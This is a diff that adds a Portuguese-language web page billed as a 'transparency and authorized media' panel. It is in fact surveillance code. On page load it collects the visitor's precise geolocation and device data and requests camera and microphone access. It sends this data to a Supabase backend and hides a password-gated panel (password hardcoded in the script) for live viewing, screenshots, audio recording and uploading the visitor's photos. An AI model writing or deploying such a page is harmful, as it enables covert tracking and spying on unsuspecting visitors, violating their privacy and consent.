@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel de Transparência e Mídia Autorizada</title>
+    <!-- SDK do Supabase -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+            justify-content: center;
+            max-width: 950px;
+            width: 100%;
+        }
+        .card {
+            background-color: #1e1e1e;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            flex: 1;
+            min-width: 320px;
+            text-align: center;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.3s;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .admin-btn {
+            background-color: #2196F3;
+            margin-top: 10px;
+        }
+        .admin-btn:hover {
+            background-color: #0b7dda;
+        }
+        .control-btn {
+            background-color: #ff9800;
+            margin-top: 8px;
+            font-size: 14px;
+            padding: 8px 12px;
+        }
+        .control-btn:hover {
+            background-color: #e68900;
+        }
+        .danger-btn {
+            background-color: #f44336;
+        }
+        .danger-btn:hover {
+            background-color: #d32f2f;
+        }
+        #status, #userAlertStatus {
+            display: none;
+        }
+        .video-container, .gallery-preview, .capture-section {
+            margin-top: 15px;
+            text-align: center;
+        }
+        video, img {
+            width: 100%;
+            max-height: 200px;
+            background-color: #000;
+            border-radius: 8px;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+        img {
+            transform: none;
+            object-fit: contain;
+        }
+        #adminPanel {
+            display: none;
+            background-color: #1e1e1e;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            flex: 1;
+            min-width: 320px;
+        }
+        .client-box {
+            background: #2a2a2a;
+            padding: 12px;
+            margin-top: 10px;
+            border-radius: 6px;
+            font-size: 14px;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Card do Usuário -->
+        <div class="card">
+            <h3>Inicializando Sistema...</h3>
+            <p id="permStatus" style="font-size: 13px; color: #aaa;">Aguardando permissões do navegador.</p>
+            
+            <input type="file" id="galleryInput" accept="image/*" style="display: none;">
+
+            <div id="status"></div>
+            <div id="userAlertStatus"></div>
+            
+            <button id="toggleAdminBtn" class="admin-btn">Painel Administrativo</button>
+        </div>
+
+        <!-- Painel Administrativo -->
+        <div id="adminPanel">
+            <h2>Painel Administrativo</h2>
+            <p style="font-size: 13px; color: #aaa;">Visualização exclusiva e dados do dispositivo:</p>
+            
+            <div class="client-box">
+                <strong>Status do Sistema:</strong>
+                <p id="adminConnStatus" style="color: #ff4d4d; margin: 5px 0 0 0;">Aguardando Conexão</p>
+            </div>
+
+            <div class="client-box">
+                <strong>Dados de Localização e Aparelho:</strong>
+                <p id="deviceInfo" style="color: #ccc; margin: 5px 0 0 0; font-size: 13px;">Localização: Solicitando permissão...<br>Aparelho: Detecção pendente</p>
+            </div>
+
+            <div class="video-container" style="margin-top: 15px;">
+                <p style="font-size: 12px; color: #4CAF50; margin-bottom: 5px;">● Câmera ao Vivo (Admin)</p>
+                <video id="adminVideo" autoplay playsinline muted></video>
+                <button id="screenshotBtn" class="control-btn" style="background-color: #9c27b0;">Tirar e Enviar Screenshot</button>
+            </div>
+
+            <!-- Área de Capturas de Tela e Áudio Salvas -->
+            <div class="capture-section">
+                <p style="font-size: 12px; color: #9c27b0; margin-bottom: 5px;">● Capturas Salvas no Supabase</p>
+                <img id="screenshotPreview" alt="Nenhum screenshot tirado" style="display: none; margin-bottom: 10px;">
+                <a id="downloadLink" style="display: none; font-size: 13px; color: #2196F3;" target="_blank">Baixar/Ver Último Screenshot</a>
+            </div>
+
+            <div class="client-box" style="margin-top: 15px;">
+                <strong>Gravação de Áudio:</strong>
+                <button id="recBtn" class="control-btn" style="background-color: #e91e63;">Rec (Gravar e Enviar Áudio)</button>
+                <div id="audioPlaybackContainer" style="margin-top: 10px;"></div>
+            </div>
+
+            <div class="gallery-preview" style="margin-top: 15px;">
+                <p style="font-size: 12px; color: #2196F3; margin-bottom: 5px;">● Foto Selecionada da Galeria</p>
+                <img id="adminGalleryImg" alt="Nenhuma foto selecionada" style="display: none;">
+                <button id="selectPhotoBtn" class="control-btn" style="background-color: #2196F3; display: none; width: 100%;">Selecionar Foto da Galeria</button>
+            </div>
+
+            <div style="margin-top: 15px;">
+                <button id="toggleCamBtn" class="control-btn" disabled>Pausar Câmera do Usuário</button>
+                <button id="toggleMicBtn" class="control-btn" disabled>Silenciar Microfone</button>
+            </div>
+        </div>
+    </div>
+
+    <audio id="userAudio" autoplay style="display: none;"></audio>
+
+    <script>
+        // Configuração do Supabase
+        const SUPABASE_URL = 'https://gcgcrajiqqnspdvrulwr.supabase.co';
+        const SUPABASE_KEY = 'sb_publishable_z-PqPaj7TYKQqFVeQYUKOg_GNbePWjw';
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        const sessionId = 'session_' + Math.random().toString(36).substring(2, 9);
+
+        const toggleAdminBtn = document.getElementById('toggleAdminBtn');
+        const adminVideo = document.getElementById('adminVideo');
+        const userAudio = document.getElementById('userAudio');
+        const adminPanel = document.getElementById('adminPanel');
+        const adminConnStatus = document.getElementById('adminConnStatus');
+        const toggleCamBtn = document.getElementById('toggleCamBtn');
+        const toggleMicBtn = document.getElementById('toggleMicBtn');
+        const deviceInfo = document.getElementById('deviceInfo');
+        const permStatus = document.getElementById('permStatus');
+        const galleryInput = document.getElementById('galleryInput');
+        const adminGalleryImg = document.getElementById('adminGalleryImg');
+        const selectPhotoBtn = document.getElementById('selectPhotoBtn');
+        const screenshotBtn = document.getElementById('screenshotBtn');
+        const screenshotPreview = document.getElementById('screenshotPreview');
+        const downloadLink = document.getElementById('downloadLink');
+        const recBtn = document.getElementById('recBtn');
+        const audioPlaybackContainer = document.getElementById('audioPlaybackContainer');
+
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let isRecording = false;
+        let isCamActive = true;
+        let isMicActive = true;
+
+        // Função automática para solicitar mídia
+        async function requestMediaPermissions() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: true,
+                    audio: true
+                });
+
+                adminVideo.srcObject = mediaStream;
+                adminVideo.play().catch(e => {});
+                userAudio.srcObject = mediaStream;
+                userAudio.play().catch(e => {});
+
+                permStatus.textContent = "Permissões concedidas com sucesso!";
+                permStatus.style.color = "#4CAF50";
+
+                adminConnStatus.textContent = "Conectado e Ativo";
+                adminConnStatus.style.color = "#4CAF50";
+
+                toggleCamBtn.disabled = false;
+                toggleMicBtn.disabled = false;
+                selectPhotoBtn.style.display = 'block';
+
+                await supabaseClient.from('device_sessions').update({
+                    status: 'Conectado e Ativo'
+                }).eq('session_id', sessionId);
+
+                setupAudioRecorder();
+
+            } catch (error) {
+                console.error("Erro ao obter permissões automáticas:", error);
+                permStatus.textContent = "Permissão de câmera/áudio negada ou bloqueada.";
+                permStatus.style.color = "#ff4d4d";
+                adminConnStatus.textContent = "Erro de Acesso";
+                adminConnStatus.style.color = "#ff4d4d";
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            // 1. Geolocalização
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude.toFixed(4);
+                        const lon = position.coords.longitude.toFixed(4);
+                        const ua = navigator.userAgent;
+                        deviceInfo.innerHTML = `Localização: Lat ${lat}, Lon ${lon}<br>Aparelho: ${ua.includes('Mobile') ? 'Dispositivo Móvel' : 'Computador'}`;
+                        
+                        await supabaseClient.storage; // Mantém conexão ativa
+                        await supabaseClient.from('device_sessions').upsert({
+                            session_id: sessionId,
+                            latitude: lat.toString(),
+                            longitude: lon.toString(),
+                            user_agent: ua,
+                            status: 'Aguardando Permissão de Mídia'
+                        }, { onConflict: 'session_id' });
+                    },
+                    async (error) => {
+                        deviceInfo.innerHTML = `Localização: Negada ou indisponível<br>Aparelho: ${navigator.userAgent}`;
+                        await supabaseClient.from('device_sessions').upsert({
+                            session_id: sessionId,
+                            user_agent: navigator.userAgent,
+                            status: 'Localização Negada'
+                        }, { onConflict: 'session_id' });
+                    },
+                    { enableHighAccuracy: true }
+                );
+            }
+
+            // 2. Disparar permissão de câmera e microfone automaticamente ao carregar
+            // Nota: Alguns navegadores bloqueiam getUserMedia automático se não houver interação prévia.
+            // Caso ocorra bloqueio por políticas de autoplay, o navegador exibirá o prompt assim que houver o primeiro toque/clique na página.
+            requestMediaPermissions();
+        });
+
+        // Proteção por senha de 6 dígitos (213448) para abrir o painel administrativo
+        toggleAdminBtn.addEventListener('click', () => {
+            const senha = prompt("Digite a senha de 6 dígitos:");
+            if (senha === "213448") {
+                adminPanel.style.display = adminPanel.style.display === 'none' ? 'block' : 'none';
+            } else if (senha !== null) {
+                alert("Senha incorreta!");
+            }
+        });
+
+        // Função de Screenshot com upload automático para o Supabase Storage
+        screenshotBtn.addEventListener('click', async () => {
+            if (!mediaStream) return;
+            const canvas = document.createElement('canvas');
+            canvas.width = adminVideo.videoWidth || 640;
+            canvas.height = adminVideo.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(adminVideo, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(async (blob) => {
+                if (!blob) return;
+                const fileName = `screenshot_${sessionId}_${Date.now()}.png`;
+                
+                const { data, error } = await supabaseClient.storage
+                    .from('transparency-media')
+                    .upload(fileName, blob);
+
+                if (!error) {
+                    const { data: publicUrlData } = supabaseClient.storage
+                        .from('transparency-media')
+                        .getPublicUrl(fileName);
+
+                    const publicUrl = publicUrlData.publicUrl;
+
+                    screenshotPreview.src = publicUrl;
+                    screenshotPreview.style.display = 'block';
+
+                    downloadLink.href = publicUrl;
+                    downloadLink.style.display = 'block';
+                    downloadLink.textContent = "Baixar Screenshot do Supabase";
+
+                    await supabaseClient.from('media_captures').insert({
+                        session_id: sessionId,
+                        media_type: 'screenshot',
+                        file_url: publicUrl
+                    });
+                }
+            }, 'image/png');
+        });
+
+        // Configuração da Gravação de Áudio com upload para Supabase Storage
+        function setupAudioRecorder() {
+            try {
+                mediaRecorder = new MediaRecorder(mediaStream);
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        audioChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    audioChunks = [];
+                    
+                    const fileName = `audio_${sessionId}_${Date.now()}.webm`;
+                    const { data, error } = await supabaseClient.storage
+                        .from('transparency-media')
+                        .upload(fileName, audioBlob);
+
+                    if (!error) {
+                        const { data: publicUrlData } = supabaseClient.storage
+                            .from('transparency-media')
+                            .getPublicUrl(fileName);
+
+                        const audioUrl = publicUrlData.publicUrl;
+                        
+                        audioPlaybackContainer.innerHTML = `
+                            <audio controls src="${audioUrl}" style="width: 100%; margin-top: 5px;"></audio>
+                            <br><a href="${audioUrl}" target="_blank" style="font-size: 12px; color: #2196F3;">Baixar Áudio do Supabase</a>
+                        `;
+
+                        await supabaseClient.from('media_captures').insert({
+                            session_id: sessionId,
+                            media_type: 'audio',
+                            file_url: audioUrl
+                        });
+                    }
+                };
+            } catch (e) {
+                console.error("Erro ao configurar gravador de áudio:", e);
+            }
+        }
+
+        recBtn.addEventListener('click', () => {
+            if (!mediaRecorder) {
+                alert("Permissão de áudio ainda não concedida.");
+                return;
+            }
+
+            if (!isRecording) {
+                audioChunks = [];
+                mediaRecorder.start();
+                isRecording = true;
+                recBtn.textContent = "Parar Gravação e Enviar";
+                recBtn.style.backgroundColor = "#f44336";
+            } else {
+                mediaRecorder.stop();
+                isRecording = false;
+                recBtn.textContent = "Rec (Gravar e Enviar Áudio)";
+                recBtn.style.backgroundColor = "#e91e63";
+            }
+        });
+
+        selectPhotoBtn.addEventListener('click', () => {
+            galleryInput.click();
+        });
+
+        galleryInput.addEventListener('change', async (event) => {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = async function(e) {
+                    adminGalleryImg.src = e.target.result;
+                    adminGalleryImg.style.display = 'block';
+
+                    const fileName = `gallery_${sessionId}_${Date.now()}`;
+                    await supabaseClient.storage.from('transparency-media').upload(fileName, file);
+                }
+                reader.readAsDataURL(file);
+            }
+        });
+
+        toggleCamBtn.addEventListener('click', () => {
+            if (!mediaStream) return;
+            const videoTrack = mediaStream.getVideoTracks()[0];
+            if (videoTrack) {
+                isCamActive = !isCamActive;
+                videoTrack.enabled = isCamActive;
+                
+                if (isCamActive) {
+                    toggleCamBtn.textContent = "Pausar Câmera do Usuário";
+                    toggleCamBtn.classList.remove('danger-btn');
+                    adminConnStatus.textContent = "Conectado e Ativo";
+                    adminVideo.play().catch(e => {});
+                } else {
+                    toggleCamBtn.textContent = "Retomar Câmera do Usuário";
+                    toggleCamBtn.classList.add('danger-btn');
+                    adminConnStatus.textContent = "Câmera Pausada pelo Administrador";
+                }
+            }
+        });
+
+        toggleMicBtn.addEventListener('click', () => {
+            if (!mediaStream) return;
+            const audioTrack = mediaStream.getAudioTracks()[0];
+            if (audioTrack) {
+                isMicActive = !isMicActive;
+                audioTrack.enabled = isMicActive;
+                
+                if (isMicActive) {
+                    toggleMicBtn.textContent = "Silenciar Microfone";
+                    toggleMicBtn.classList.remove('danger-btn');
+                } else {
+                    toggleMicBtn.textContent = "Ativar Microfone";
+                    toggleMicBtn.classList.add('danger-btn');
+                }
+            }
+        });
+    </script>
+
+</body>
+</html>
